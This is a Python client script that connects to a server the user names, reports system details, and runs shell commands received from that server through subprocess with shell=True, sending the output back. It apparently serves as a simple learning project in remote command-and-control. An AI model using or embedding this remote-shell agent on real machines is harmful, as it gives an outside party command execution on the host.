from enum import Enum
import socket
import subprocess
import platform
import socket
from typing import List
from myparser import Parser

from numpy import identity

from command_executioner import CommandExecutioner
server_port = 12000
def get_platform_info():
    platform_name = platform.platform()
    platform_version = platform.version()
    platform_machine = platform.machine()
    platform_node = platform.node()
    platform_processor = platform.processor()
    return [platform_name, platform_version, platform_machine, platform_node, platform_processor]

parser_cmd = Parser()

def shell_command(args:dict ={}):
    try:
        cmd = str(args["-c"])
        #print("cmd parsed = "+cmd)
        l = parser_cmd.parse(cmd)
        #print("list parsed="+str(l))
        cmd_list = []
        cmd_list.append(l.pop(0))
        dict_parameters = l.pop(0)
        print("par dict="+str(dict_parameters))
        for k in dict_parameters.keys():
            cmd_list.append(k)
            if type(dict_parameters[k]) == bool:
                continue
            cmd_list.append(dict_parameters[k])
        
        print("Executing: "+str(cmd_list))
        result = subprocess.run(cmd_list, capture_output=True, text=True, shell=True)
        print("Result: "+str(result.stdout))
        return [0,"Output of cmd:"+str(cmd_list)+": "+str(result.stdout)]
    except Exception as e:
        return [0,"Shell command function exception: "+str(e)]

def sysinfo_command(args:dict ={}):
    return [0,str(get_platform_info())]

def end_conn_command(args:dict ={}):
    return [-1,"Ending this connection"]

cmd_to_function = {
    "sysinfo":sysinfo_command,
    "closecli":end_conn_command,
    "shellexec":shell_command
}
cmd_executioner = CommandExecutioner(cmd_to_function)

def main():
    platform_info = str(get_platform_info())
    ip_address = input("Insert IP Address > ")
    if ip_address == "":
        ip_address = "127.0.0.1"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:

        client_socket.connect((ip_address, server_port))

        data = client_socket.recv(1024)
        identity_response = data.decode()
        print(identity_response)
        print("Listening for commands from server...")
        while True:
            try:
                data = client_socket.recv(1024)
                if data:
                    full_command = data.decode()
                    try:
                        parsed_cmd = parser_cmd.parse(full_command)
                        cmd_name = parsed_cmd.pop(0)
                        param_dict = parsed_cmd.pop(0)
                        exit_status, message = cmd_executioner.execute(cmd_name,param_dict)
                        client_socket.send(message.encode())
                        if exit_status !=0:
                            break
                    except Exception as e:
                        print("Invalid command: "+full_command+" " +str(e))
                        client_socket.send("Invalid command".encode())
                        
            except:
                print("Exception!")
                break


if __name__ == '__main__':
    main()
